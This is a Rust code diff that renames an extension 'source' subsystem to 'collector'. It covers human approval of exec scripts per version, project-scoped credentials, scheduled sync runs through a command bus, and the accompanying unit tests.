-/// A person approves exec source `extension/source_id` on this machine at
+/// A person approves exec collector `owner/id` on this machine at
 /// `version` — the listing's version they reviewed (UI only; an agent can't
-/// approve). A source that changed since is refused, and nothing is
-/// recorded. A derived source runs no program and needs no approval.
+/// approve). A collector that changed since is refused, and nothing is
+/// recorded. A derived collector runs no program and needs no approval.
 pub fn approve_reviewed(
-    ctx: &Sources<'_>,
-    extension: &str,
-    source_id: &str,
+    ctx: &Collectors<'_>,
+    owner: &str,
+    id: &str,
     version: &str,
-) -> Result<(), RunSourceError> {
-    let (ext, spec) = find_source(ctx, extension, source_id)?;
+) -> Result<(), RunCollectorError> {
+    let (ext, spec) = find_collector(ctx, owner, id)?;
     if spec.runtime.is_derived() {
         return Ok(());
     }
     let hash = approval_hash(&ctx.root.join(&ext.path), &spec).map_err(|e| {
-        RunSourceError::Failed(format!("source `{source_id}`: entry `{}`: {e}", spec.entry))
+        RunCollectorError::Failed(format!(
+            "collector `{id}`: entry `{}`: {e}",
+            entry_of(&spec)
+        ))
     })?;
     if version != hash {
-        return Err(RunSourceError::NeedsApproval(format!(
-            "source `{extension}/{source_id}` changed since you reviewed it; look at it \
-             again before approving"
+        return Err(RunCollectorError::NeedsApproval(format!(
+            "collector `{owner}/{id}` changed since you reviewed it; look at it again before \
+             approving"
         )));
     }
-    approve(ctx.approvals, extension, source_id, &hash)
-        .map_err(|e| RunSourceError::Storage(DomainError::Storage(format!("record approval: {e}"))))
+    approve(ctx.approvals, owner, id, &hash).map_err(|e| {
+        RunCollectorError::Storage(DomainError::Storage(format!("record approval: {e}")))
+    })
 }
 
-/// Find a source in `ctx.root` and run it, stopping at its output. The
-/// outer error means it didn't run (unknown, or not approved); the inner
-/// one that it ran and failed.
+/// Find a collector in `ctx.root` and run it, stopping at its output. The
+/// outer error means it didn't run (unknown, not approved, or a `read`
+/// collector, which `provider.sync` runs); the inner one that it ran and
+/// failed.
 async fn produce(
-    ctx: &Sources<'_>,
-    extension: &str,
-    source_id: &str,
-) -> Result<(SourceSpec, Result<SourceOutput, String>), RunSourceError> {
+    ctx: &Collectors<'_>,
+    owner: &str,
+    id: &str,
+) -> Result<(CollectorSpec, Result<ScriptOutput, String>), RunCollectorError> {
     let (root, approvals) = (ctx.root, ctx.approvals);
-    let (ext, spec) = find_source(ctx, extension, source_id)?;
+    let (ext, spec) = find_collector(ctx, owner, id)?;
     let ext_dir = root.join(&ext.path);
+    if spec.runtime == CollectorRuntime::Read {
+        return Err(RunCollectorError::Failed(format!(
+            "collector `{owner}/{id}` reads a provider; run `provider.sync` for it"
+        )));
+    }
     if spec.runtime.is_derived() {
-        let output = match crate::extensions::read_extension_file(root, &ext.name, &spec.entry) {
+        let output = match crate::extensions::read_extension_file(root, &ext.name, entry_of(&spec))
+        {
             Some(script) => {
                 let oracle = crate::ai_compute::CollectorOracle::new(
                     ctx.ai.clone(),
-                    format!("source:{}/{}", ext.name, spec.id),
+                    format!("collector:{}/{}", ext.name, spec.id),
                 );
-                derive_source(&ctx.layer, script, &spec, std::sync::Arc::new(oracle)).await
+                derive_collector(&ctx.layer, script, &spec, std::sync::Arc::new(oracle)).await
             }
             None => Err(format!(
-                "source `{source_id}`: entry `{}` doesn't exist in the extension",
-                spec.entry
+                "collector `{id}`: entry `{}` doesn't exist in the extension",
+                entry_of(&spec)
             )),
         };
         return Ok((spec, output));
     }
     let hash = approval_hash(&ext_dir, &spec).map_err(|e| {
-        RunSourceError::Failed(format!("source `{source_id}`: entry `{}`: {e}", spec.entry))
+        RunCollectorError::Failed(format!(
+            "collector `{id}`: entry `{}`: {e}",
+            entry_of(&spec)
+        ))
     })?;
-    if !is_approved(approvals, extension, source_id, &hash) {
-        return Err(RunSourceError::NeedsApproval(format!(
-            "source `{extension}/{source_id}` runs `{}` and needs a person's approval first \
+    if !is_approved(approvals, owner, id, &hash) {
+        return Err(RunCollectorError::NeedsApproval(format!(
+            "collector `{owner}/{id}` runs `{}` and needs a person's approval first \
              (Settings → Data → Approve & Run). Approval is per machine and per script version.",
-            spec.entry
+            entry_of(&spec)
         )));
     }
 
@@ -803,7 +972,7 @@ async fn produce(
     for name in &spec.credentials {
         match ctx
             .secrets
-            .get(&credential_account(&ctx.project, extension, name))
+            .get(&credential_account(&ctx.project, owner, name))
         {
             Ok(Some(v)) => {
                 credentials.insert(name.clone(), v);
@@ -820,65 +989,31 @@ async fn produce(
     Ok((spec, output))
 }
 
-/// Record a run's outcome as the source's state, then hand it back.
-async fn record(
-    store: &SqliteExtSourceStore,
-    extension: &str,
-    source_id: &str,
-    result: Result<SourceRunReport, String>,
-) -> Result<SourceRunReport, RunSourceError> {
-    // Timestamp serializes as an RFC 3339 string.
-    let now = serde_json::to_value(oxplow_domain::Timestamp::now())
-        .ok()
-        .and_then(|v| v.as_str().map(str::to_string))
-        .unwrap_or_default();
-    let state = match &result {
-        Ok(report) => SourceState {
-            extension: extension.to_string(),
-            source_id: source_id.to_string(),
-            status: "ok".into(),
-            last_run_at: now,
-            error: None,
-            row_counts: report.row_counts.clone(),
-        },
-        Err(e) => SourceState {
-            extension: extension.to_string(),
-            source_id: source_id.to_string(),
-            status: "error".into(),
-            last_run_at: now,
-            error: Some(e.clone()),
-            row_counts: BTreeMap::new(),
-        },
-    };
-    store
-        .record_run(state)
-        .await
-        .map_err(RunSourceError::Storage)?;
-    result.map_err(RunSourceError::Failed)
-}
-
-/// What running a project source needs, owned: the `source.sync`
-/// command and the scheduler hold one (it's registered while `Services` is built).
+/// What running a collector needs, owned: the `collector.sync` command
+/// holds one (it's registered while `Services` is built).
 #[derive(Clone)]
-pub struct SourceRunner {
+pub struct CollectorRunner {
     pub project_dir: PathBuf,
     pub approvals: Arc<crate::exec_consent::ApprovalStore>,
-    pub store: Arc<SqliteExtSourceStore>,
+    pub store: Arc<SqliteCollectorStore>,
+    pub db: oxplow_db::Database,
+    pub schemas: Arc<EventSchemaRegistry>,
     pub secrets: Arc<dyn SecretStore>,
     pub layer: crate::sql_gateway::SqlGateway,
     pub catalog: Arc<crate::extension_catalog::ExtensionCatalog>,
     pub ai: Arc<crate::ai_compute::AiCompute>,
     pub worktrees: Arc<crate::worktrees::WorktreeRouter>,
-    pub events: crate::events::EventBus,
 }
 
-impl SourceRunner {
-    fn sources<'a>(&'a self, root: &'a Path) -> Sources<'a> {
-        Sources {
+impl CollectorRunner {
+    fn collectors<'a>(&'a self, root: &'a Path) -> Collectors<'a> {
+        Collectors {
             root,
             project: project_key(&self.project_dir),
             approvals: &self.approvals,
             store: &self.store,
+            db: self.db.clone(),
+            schemas: self.schemas.clone(),
             secrets: self.secrets.as_ref(),
             layer: self.layer.clone(),
             catalog: &self.catalog,
@@ -886,42 +1021,38 @@ impl SourceRunner {
         }
     }
 
-    /// Run a project source from the primary worktree (source data is
-    /// project-wide) and announce `SourceSynced` when it actually ran (ok
-    /// or failed). It never approves: a refused run (no consent) or an
-    /// unknown source changed nothing.
+    /// Run a collector from the primary worktree (collected data is
+    /// project-wide). It never approves: a refused run (no consent) or an
+    /// unknown collector changes nothing; one that ran is announced by its
+    /// `collector_run` commit (`v_collector_run` changes).
     pub async fn sync(
         &self,
-        extension: &str,
-        source_id: &str,
-    ) -> Result<SourceRunReport, RunSourceError> {
+        owner: &str,
+        id: &str,
+        trigger: RunTrigger,
+        source: &str,
+    ) -> Result<CollectorRunReport, RunCollectorError> {
         let root = self.worktrees.resolve(None).await;
-        let result = run_source(&self.sources(&root), extension, source_id).await;
-        if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
-            self.events.emit(crate::OxplowEvent::SourceSynced {
-                extension: extension.to_string(),
-                source_id: source_id.to_string(),
-            });
-        }
-        result
+        run_collector(&self.collectors(&root), owner, id, trigger, source).await
     }
 }
 
-/// `source.sync { extension, source }`: run an approved project source now
-/// (External: it runs the source's program). Any actor may run it; none
-/// approves through it — consent is a person's, in Settings → Data.
-pub const SYNC: &str = "source.sync";
+/// `collector.sync { owner, id }`: run an approved collector now
+/// (External: it runs the collector's program or script). Any actor may
+/// run it; none approves through it — consent is a person's, in Settings
+/// → Data. Run by the system it's the `every:` schedule's run.
+pub const SYNC: &str = "collector.sync";
 
 #[derive(Debug, Deserialize, JsonSchema)]
 #[serde(deny_unknown_fields)]
 pub struct SyncInput {
-    /// The extension folder under `oxplow/extensions/`.
-    pub extension: String,
-    /// The source's `id` in that extension's `extension.yaml`.
-    pub source: String,
+    /// The extension that declares it.
+    pub owner: String,
+    /// The collector's `id` in its owner's `collectors:`.
+    pub id: String,
 }
 
-pub fn sync_command(sync: SourceRunner) -> crate::commands::Command {
+pub fn sync_command(sync: CollectorRunner) -> crate::commands::Command {
     use crate::commands::{Command, Handler, HandlerOutput};
     use oxplow_domain::{
         Atomicity, CommandEffect, CommandError, CommandSpec, Confirm, Invokers, Lifecycle,
@@ -929,9 +1060,9 @@ pub fn sync_command(sync: SourceRunner) -> crate::commands::Command {
     Command::new(
         CommandSpec {
             name: SYNC.into(),
-            summary: "Run an approved extension source now, refreshing its entities (runs the \
-                      source's program, a system the bus doesn't own). It never approves: an \
-                      unapproved exec source is refused."
+            summary: "Run an approved collector now, refreshing what it collects (runs the \
+                      collector's program or script, which the bus doesn't own). It never \
+                      approves: an unapproved exec collector is refused."
                 .into(),
             input_schema: serde_json::to_value(schemars::schema_for!(SyncInput))
                 .expect("schema serializes"),
@@ -942,32 +1073,37 @@ pub fn sync_command(sync: SourceRunner) -> crate::commands::Command {
             atomicity: Atomicity::External,
             effect: CommandEffect::Write,
         },
-        Handler::External(std::sync::Arc::new(move |_actor, input| {
+        Handler::External(std::sync::Arc::new(move |actor, input| {
             let sync = sync.clone();
+            let source = actor.source();
+            let trigger = match actor {
+                oxplow_domain::Actor::System => RunTrigger::Every,
+                _ => RunTrigger::Manual,
+            };
             Box::pin(async move {
                 let input: SyncInput =
                     serde_json::from_value(input).map_err(|e| CommandError::Invalid {
                         field: None,
                         message: e.to_string(),
                     })?;
-                let report =
-                    sync.sync(&input.extension, &input.source)
-                        .await
-                        .map_err(|e| match e {
-                            RunSourceError::NotFound => CommandError::Invalid {
-                                field: Some("/source".into()),
-                                message: format!(
-                                    "no source `{}/{}` in the project's extensions",
-                                    input.extension, input.source
-                                ),
-                            },
-                            RunSourceError::NeedsApproval(m) => CommandError::Invalid {
-                                field: Some("/source".into()),
-                                message: m,
-                            },
-                            RunSourceError::Failed(m) => CommandError::Failed { message: m },
-                            RunSourceError::Storage(e) => CommandError::from(e),
-                        })?;
+                let report = sync
+                    .sync(&input.owner, &input.id, trigger, &source)
+                    .await
+                    .map_err(|e| match e {
+                        RunCollectorError::NotFound => CommandError::Invalid {
+                            field: Some("/id".into()),
+                            message: format!(
+                                "no collector `{}/{}` in the project's extensions",
+                                input.owner, input.id
+                            ),
+                        },
+                        RunCollectorError::NeedsApproval(m) => CommandError::Invalid {
+                            field: Some("/id".into()),
+                            message: m,
+                        },
+                        RunCollectorError::Failed(m) => CommandError::Failed { message: m },
+                        RunCollectorError::Storage(e) => CommandError::from(e),
+                    })?;
                 Ok(HandlerOutput {
                     result: serde_json::to_value(report).expect("report serializes"),
                     ..HandlerOutput::default()
@@ -975,15 +1111,15 @@ pub fn sync_command(sync: SourceRunner) -> crate::commands::Command {
             })
         })),
     )
-    .expect("source.sync registers")
+    .expect("collector.sync registers")
 }
 
-/// Run an approved exec source and parse its output.
+/// Run an approved exec collector and parse its output.
 async fn exec_approved(
     ext_dir: &Path,
-    spec: &SourceSpec,
+    spec: &CollectorSpec,
     credentials: BTreeMap<String, String>,
-) -> Result<SourceOutput, String> {
+) -> Result<ScriptOutput, String> {
     let dir = ext_dir.to_path_buf();
     let spec_owned = spec.clone();
     // Where it's enforced, the program's only way out is a proxy that goes
@@ -1002,53 +1138,35 @@ async fn exec_approved(
         None => Egress::Open,
     };
     let raw = tokio::task::spawn_blocking(move || {
-        exec_source(
+        exec_collector(
             &dir,
             &spec_owned,
             &|k| std::env::var(k).ok(),
             &credentials,
-            SOURCE_TIMEOUT,
+            COLLECTOR_TIMEOUT,
             &egress,
         )
     })
     .await
-    .map_err(|e| format!("source task panicked: {e}"))??;
+    .map_err(|e| format!("collector task panicked: {e}"))??;
     Ok(raw)
-}
-
-/// Coerce a run's output to the declared entities and write it, per the
-/// source's `sync` mode, atomically.
-async fn store_output(
-    extension: &str,
-    spec: &SourceSpec,
-    output: SourceOutput,
-    store: &SqliteExtSourceStore,
-) -> Result<SourceRunReport, String> {
-    let writes = plan_writes(extension, spec, output)?;
-    let names: Vec<String> = writes.iter().map(|(t, _)| t.entity.clone()).collect();
-    let counts = store.write_rows(writes).await.map_err(|e| e.to_string())?;
-    Ok(SourceRunReport {
-        extension: extension.to_string(),
-        source_id: spec.id.clone(),
-        row_counts: names.into_iter().zip(counts).collect(),
-    })
 }
 
 /// A run's output as the writes it makes, coerced to the declared columns.
 fn plan_writes(
-    extension: &str,
-    spec: &SourceSpec,
-    mut output: SourceOutput,
+    owner: &str,
+    spec: &CollectorSpec,
+    mut output: ScriptOutput,
 ) -> Result<Vec<(EntityTable, EntityWrite)>, String> {
     let mut writes = Vec::new();
     for entity in &spec.entities {
         let rows = output.entities.remove(&entity.name);
         let write = match spec.sync {
-            // An entity the source didn't mention this run is left empty.
-            SourceSync::Replace => {
+            // An entity the run didn't mention this run is left empty.
+            CollectorSync::Replace => {
                 EntityWrite::Replace(coerce_rows(entity, rows.unwrap_or_default())?)
             }
-            SourceSync::Upsert => {
+            CollectorSync::Upsert => {
                 let deleted = output.deleted.remove(&entity.name).unwrap_or_default();
                 // Nothing said about it: leave it alone.
                 if rows.is_none() && deleted.is_empty() {
@@ -1062,11 +1180,11 @@ fn plan_writes(
         };
         writes.push((
             EntityTable {
-                extension: extension.to_string(),
+                extension: owner.to_string(),
                 entity: entity.name.clone(),
                 view: entity.view.clone(),
                 key: entity.key.clone(),
-                description: entity_description(extension, entity),
+                description: entity_description(owner, entity),
                 columns: entity
                     .columns
                     .iter()
@@ -1085,10 +1203,10 @@ fn plan_writes(
 
 /// An entity's catalog description: its doc (or where it comes from),
 /// then the joins it documents.
-fn entity_description(extension: &str, entity: &SourceEntity) -> String {
+fn entity_description(owner: &str, entity: &EntityDecl) -> String {
     let mut out = if entity.doc.trim().is_empty() {
         format!(
-            "`{}` records synced by the `{extension}` extension.",
+            "`{}` records collected by the `{owner}` extension.",
             entity.name
         )
     } else {
@@ -1101,16 +1219,13 @@ fn entity_description(extension: &str, entity: &SourceEntity) -> String {
 }
 
 /// Coerce tombstone keys to the entity key column's type.
-fn coerce_keys(
-    entity: &SourceEntity,
-    keys: Vec<serde_json::Value>,
-) -> Result<Vec<SqlCell>, String> {
+fn coerce_keys(entity: &EntityDecl, keys: Vec<serde_json::Value>) -> Result<Vec<SqlCell>, String> {
     let rows = keys
         .into_iter()
         .map(|k| serde_json::json!({ entity.key.clone(): k }))
         .collect();
     // Reuse the row coercion on one-column rows of just the key.
-    let key_only = SourceEntity {
+    let key_only = EntityDecl {
         columns: entity
             .columns
             .iter()
@@ -1143,37 +1258,37 @@ mod tests {
     }
 
     use super::*;
-    use crate::extension_sources::{parse_sources, SourceSchedule};
+    use oxplow_config::collectors::parse_collectors;
     use serde_json::json;
 
     /// The version a person would see in the listing right now.
     /// A person approves the version they reviewed, then it runs.
     async fn reviewed_run(
-        ctx: &Sources<'_>,
+        ctx: &Collectors<'_>,
         extension: &str,
         source: &str,
         version: &str,
-    ) -> Result<SourceRunReport, RunSourceError> {
+    ) -> Result<CollectorRunReport, RunCollectorError> {
         approve_reviewed(ctx, extension, source, version)?;
-        run_source(ctx, extension, source).await
+        run_collector(ctx, extension, source, RunTrigger::Manual, "human").await
     }
 
-    async fn version_of(ctx: &Sources<'_>, extension: &str, source: &str) -> String {
-        list_sources(ctx)
+    async fn version_of(ctx: &Collectors<'_>, extension: &str, source: &str) -> String {
+        list_collectors(ctx)
             .await
             .unwrap()
             .into_iter()
-            .find(|l| l.extension == extension && l.spec.id == source)
+            .find(|l| l.owner == extension && l.spec.id == source)
             .and_then(|l| l.version)
             .unwrap_or_default()
     }
 
-    fn spec(entry: &str, env: &[&str]) -> SourceSpec {
+    fn spec(entry: &str, env: &[&str]) -> CollectorSpec {
         let yaml = format!(
             "- id: gh\n  runtime: exec\n  entry: {entry}\n  env: [{}]\n  entities:\n    - name: pr\n      key: number\n      columns: {{ number: int, title: text, score: real, draft: bool, opened_at: time }}\n",
             env.join(", ")
         );
-        let (s, e) = parse_sources("my-gh", &serde_yaml::from_str(&yaml).unwrap());
+        let (s, e) = parse_collectors("my-gh", &serde_yaml::from_str(&yaml).unwrap(), &|_| true);
         assert!(e.is_empty(), "{e:?}");
         s.into_iter().next().unwrap()
     }
@@ -1219,7 +1334,7 @@ mod tests {
             "SECRET" => Some("leak".to_string()),
             _ => None,
         };
-        let out = exec_source(
+        let out = exec_collector(
             ext.path(),
             &spec("bin/sync.sh", &["GH_TOKEN"]),
             &env,
@@ -1236,7 +1351,7 @@ mod tests {
         let ext = tempfile::tempdir().unwrap();
         let none = |_: &str| None;
         script(ext.path(), "fail.sh", "echo boom >&2; exit 3");
-        let e = exec_source(
+        let e = exec_collector(
             ext.path(),
             &spec("fail.sh", &[]),
             &none,
@@ -1248,7 +1363,7 @@ mod tests {
         assert!(e.contains("exit") && e.contains("boom"), "{e}");
 
         script(ext.path(), "slow.sh", "sleep 5");
-        let e = exec_source(
+        let e = exec_collector(
             ext.path(),
             &spec("slow.sh", &[]),
             &none,
@@ -1260,7 +1375,7 @@ mod tests {
         assert!(e.contains("timed out"), "{e}");
 
         script(ext.path(), "junk.sh", "echo not json");
-        let e = exec_source(
+        let e = exec_collector(
             ext.path(),
             &spec("junk.sh", &[]),
             &none,
@@ -1276,7 +1391,7 @@ mod tests {
             "undeclared.sh",
             r#"echo '{"entities":{"issue":[]}}'"#,
         );
-        let e = exec_source(
+        let e = exec_collector(
             ext.path(),
             &spec("undeclared.sh", &[]),
             &none,
@@ -1287,7 +1402,7 @@ mod tests {
         .unwrap_err();
         assert!(e.contains("issue"), "{e}");
 
-        let e = exec_source(
+        let e = exec_collector(
             ext.path(),
             &spec("missing.sh", &[]),
             &none,
@@ -1328,11 +1443,10 @@ mod tests {
         assert!(err.contains("key"), "{err}");
         let err = coerce_rows(e, vec![json!([1, 2])]).unwrap_err();
         assert!(err.contains("object"), "{err}");
-        let _ = SourceSchedule::Manual;
     }
 
     #[tokio::test]
-    async fn run_source_requires_consent_then_stores_queryable_rows() {
+    async fn run_collector_requires_consent_then_stores_queryable_rows() {
         let root = tempfile::tempdir().unwrap();
         let state = root.path().join(".oxplow");
         let ext = root.path().join("oxplow/extensions/my-gh");
@@ -1348,27 +1462,30 @@ mod tests {
             r#"echo '{"entities":{"pr":[{"number":1,"title":"First"},{"number":2,"title":"Second"}]}}'"#,
         );
         let db = oxplow_db::Database::in_memory();
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
 
-        let err = run_source(&ctx, "my-gh", "gh").await.unwrap_err();
+        let err = run_collector(&ctx, "my-gh", "gh", RunTrigger::Manual, "human")
+            .await
+            .unwrap_err();
         assert!(
-            matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("approval")),
+            matches!(err, RunCollectorError::NeedsApproval(ref m) if m.contains("approval")),
             "{err:?}"
         );
-        assert!(!err.ran());
         assert!(
-            store.list_states().await.unwrap().is_empty(),
+            store.list_runs().await.unwrap().is_empty(),
             "refused runs record nothing"
         );
 
@@ -1386,44 +1503,50 @@ mod tests {
         );
 
         // Approved now, so a later run needs no approve flag…
-        run_source(&ctx, "my-gh", "gh").await.unwrap();
+        run_collector(&ctx, "my-gh", "gh", RunTrigger::Manual, "human")
+            .await
+            .unwrap();
         // …and a failing run is recorded, keeping the last good rows.
         script(&ext, "sync.sh", "echo nope >&2; exit 1");
-        let err = run_source(&ctx, "my-gh", "gh").await.unwrap_err();
+        let err = run_collector(&ctx, "my-gh", "gh", RunTrigger::Manual, "human")
+            .await
+            .unwrap_err();
         assert!(
-            matches!(err, RunSourceError::NeedsApproval(_)),
+            matches!(err, RunCollectorError::NeedsApproval(_)),
             "script changed: {err:?}"
         );
         let err = reviewed_run(&ctx, "my-gh", "gh", &version_of(&ctx, "my-gh", "gh").await)
             .await
             .unwrap_err();
-        assert!(err.ran(), "{err:?}");
-        let st = &store.list_states().await.unwrap()[0];
+        assert!(matches!(err, RunCollectorError::Failed(_)), "{err:?}");
+        let st = &store.list_runs().await.unwrap()[0];
         assert_eq!(st.status, "error");
         assert!(st.error.as_deref().unwrap().contains("nope"));
         assert_eq!(st.row_counts["pr"], 2, "last good counts kept");
     }
 
     #[test]
-    fn due_sources_respects_schedule_approval_and_last_run() {
+    fn due_collectors_respect_trigger_approval_and_last_run() {
         let base = spec("x", &[]);
-        let listing = |schedule: SourceSchedule, approved: bool, last: Option<&str>| {
+        let listing = |trigger: Trigger, approved: bool, last: Option<&str>| {
             let mut spec = base.clone();
-            spec.schedule = schedule;
-            SourceListing {
-                extension: "e".into(),
+            spec.trigger = trigger;
+            CollectorListing {
+                owner: "e".into(),
                 spec,
                 approved,
                 network_enforced: false,
                 credentials: vec![],
                 version: None,
-                state: last.map(|t| SourceState {
-                    extension: "e".into(),
-                    source_id: "gh".into(),
+                run: last.map(|t| CollectorRun {
+                    owner: "e".into(),
+                    id: "gh".into(),
                     status: "ok".into(),
                     last_run_at: t.into(),
                     error: None,
                     row_counts: BTreeMap::new(),
+                    cursor: None,
+                    last_event_id: None,
                 }),
             }
         };
@@ -1435,25 +1558,25 @@ mod tests {
                 .unwrap()
                 .to_string()
         };
-        let every10 = SourceSchedule::Every { minutes: 10 };
+        let every10 = || Trigger::Every { minutes: 10 };
         let long_ago = iso(now - 11 * 60_000);
         let recent = iso(now - 5 * 60_000);
         let cases = vec![
-            (listing(every10, true, None), true),
-            (listing(every10, true, Some(&long_ago)), true),
-            (listing(every10, true, Some(&recent)), false),
-            (listing(every10, false, None), false),
-            (listing(SourceSchedule::Manual, true, None), false),
+            (listing(every10(), true, None), true),
+            (listing(every10(), true, Some(&long_ago)), true),
+            (listing(every10(), true, Some(&recent)), false),
+            (listing(every10(), false, None), false),
+            (listing(Trigger::Manual, true, None), false),
         ];
         for (l, want) in cases {
-            let due = due_sources(std::slice::from_ref(&l), now);
+            let due = due_collectors(std::slice::from_ref(&l), now);
             assert_eq!(
                 !due.is_empty(),
                 want,
                 "{:?} approved={} last={:?}",
-                l.spec.schedule,
+                l.spec.trigger,
                 l.approved,
-                l.state.as_ref().map(|s| &s.last_run_at)
+                l.run.as_ref().map(|s| &s.last_run_at)
             );
         }
     }
@@ -1467,7 +1590,7 @@ mod tests {
             r#"printf '{"entities":{"pr":[{"number":1,"title":"%s"}]}}' "$GH_PAT""#,
         );
         let creds = BTreeMap::from([("GH_PAT".to_string(), "pat-1".to_string())]);
-        let out = exec_source(
+        let out = exec_collector(
             ext.path(),
             &spec("bin/sync.sh", &[]),
             &|_| None,
@@ -1504,20 +1627,22 @@ mod tests {
         let state = root.path().join(".oxplow");
         two_extensions(root.path());
         let db = oxplow_db::Database::in_memory();
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
 
-        let list = list_sources(&ctx).await.unwrap();
+        let list = list_collectors(&ctx).await.unwrap();
         assert_eq!(
             list[0].credentials,
             vec![CredentialStatus {
@@ -1526,32 +1651,29 @@ mod tests {
             }]
         );
 
-        set_source_credential(&ctx, "one", "TOKEN", Some("secret-one")).unwrap();
-        let list = list_sources(&ctx).await.unwrap();
-        let one = list.iter().find(|l| l.extension == "one").unwrap();
-        let two = list.iter().find(|l| l.extension == "two").unwrap();
+        set_credential(&ctx, "one", "TOKEN", Some("secret-one")).unwrap();
+        let list = list_collectors(&ctx).await.unwrap();
+        let one = list.iter().find(|l| l.owner == "one").unwrap();
+        let two = list.iter().find(|l| l.owner == "two").unwrap();
         assert!(one.credentials[0].set);
         assert!(!two.credentials[0].set, "scoped to its extension");
         assert!(!serde_json::to_string(&list).unwrap().contains("secret-one"));
         // Another project with an extension of the same name doesn't see it.
-        let elsewhere = Sources {
+        let elsewhere = Collectors {
             root: root.path(),
             project: "another-project".into(),
             approvals: ctx.approvals,
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
-        let other = list_sources(&elsewhere).await.unwrap();
+        let other = list_collectors(&elsewhere).await.unwrap();
         assert!(
-            !other
-                .iter()
-                .find(|l| l.extension == "one")
-                .unwrap()
-                .credentials[0]
-                .set,
+            !other.iter().find(|l| l.owner == "one").unwrap().credentials[0].set,
             "credentials are scoped to the project"
         );
 
@@ -1576,11 +1698,11 @@ mod tests {
         );
 
         // Only declared names can be set, and None clears.
-        let err = set_source_credential(&ctx, "one", "OTHER", Some("x")).unwrap_err();
+        let err = set_credential(&ctx, "one", "OTHER", Some("x")).unwrap_err();
         assert!(err.to_string().contains("OTHER"), "{err}");
-        assert!(set_source_credential(&ctx, "nope", "TOKEN", Some("x")).is_err());
-        set_source_credential(&ctx, "one", "TOKEN", None).unwrap();
-        assert!(!list_sources(&ctx).await.unwrap()[0].credentials[0].set);
+        assert!(set_credential(&ctx, "nope", "TOKEN", Some("x")).is_err());
+        set_credential(&ctx, "one", "TOKEN", None).unwrap();
+        assert!(!list_collectors(&ctx).await.unwrap()[0].credentials[0].set);
     }
 
     async fn task_db() -> oxplow_db::Database {
@@ -1614,12 +1736,12 @@ mod tests {
         }
     }
 
-    /// A scheduled run is the `source.sync` command like every other run
+    /// A scheduled run is the `collector.sync` command like every other run
     /// (the UI's, a lens action's, MCP's), so it's audited as the system's
     /// and logs `command.executed` — one mechanism, not a second path
     /// around the bus.
     #[tokio::test]
-    async fn the_scheduler_runs_source_sync_through_the_bus() {
+    async fn the_scheduler_runs_collector_sync_through_the_bus() {
         let fx = crate::test_fixtures::services_with_effort().await;
         let root = fx.svc.layout.project_dir.clone();
         extension(
@@ -1631,7 +1753,7 @@ mod tests {
                 "def transform(input):\n    return {\"entities\": {\"hot\": [{\"id\": r[\"id\"], \"title\": r[\"title\"]} for r in input[\"rows\"]]}}\n",
             )],
         );
-        let ran = run_due_sources(&fx.svc).await;
+        let ran = run_due_collectors(&fx.svc).await;
         assert_eq!(ran, vec![("work".to_string(), "star".to_string())]);
         let audits = oxplow_db::SqliteCommandAuditStore::new(fx.svc.db.clone())
             .list_recent(10)
@@ -1646,10 +1768,27 @@ mod tests {
             oxplow_domain::events::schema::ActorKind::System
         );
         assert!(sync.error.is_none(), "{:?}", sync.error);
-        // It ran: the source's state says so, and it isn't due again.
-        let listings = list_sources(&Sources::of(&fx.svc, &root)).await.unwrap();
-        assert_eq!(listings[0].state.as_ref().unwrap().status, "ok");
-        assert!(run_due_sources(&fx.svc).await.is_empty());
+        // It ran: its run says so, logged as the schedule's, and it isn't
+        // due again.
+        let listings = list_collectors(&Collectors::of(&fx.svc, &root))
+            .await
+            .unwrap();
+        assert_eq!(listings[0].run.as_ref().unwrap().status, "ok");
+        let trigger: String = fx
+            .svc
+            .db
+            .read(|c| {
+                c.query_row(
+                    "SELECT json_extract(payload, '$.trigger') FROM event_log WHERE type = 'collector.synced'",
+                    [],
+                    |r| r.get(0),
+                )
+                .map_err(oxplow_db::map_sql_err)
+            })
+            .await
+            .unwrap();
+        assert_eq!(trigger, "every");
+        assert!(run_due_collectors(&fx.svc).await.is_empty());
     }
 
     #[tokio::test]
@@ -1673,23 +1812,33 @@ mod tests {
             ],
         );
         let db = task_db().await;
-        let store = SqliteExtSourceStore::new(db.clone());
+        let store = SqliteCollectorStore::new(db.clone());
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
-        let ctx = Sources {
+        let ctx = Collectors {
             root: root.path(),
             project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
+            db: db.clone(),
+            schemas: Arc::new(EventSchemaRegistry::core()),
             layer: crate::sql_gateway::SqlGateway::new(db.clone()),
             catalog: &crate::extension_catalog::ExtensionCatalog::new(),
             ai: no_ai(),
         };
         // No approval asked for, and the listing says it can run.
-        assert!(list_sources(&ctx).await.unwrap().iter().all(|l| l.approved));
-        let report = run_source(&ctx, "work", "star").await.unwrap();
+        assert!(list_collectors(&ctx)
+            .await
+            .unwrap()
+            .iter()
+            .all(|l| l.approved));
+        let report = run_collector(&ctx, "work", "star", RunTrigger::Manual, "human")
+            .await
+            .unwrap();
         assert_eq!(report.row_counts["hot"], 1);
-        run_source(&ctx, "work", "jq").await.unwrap();
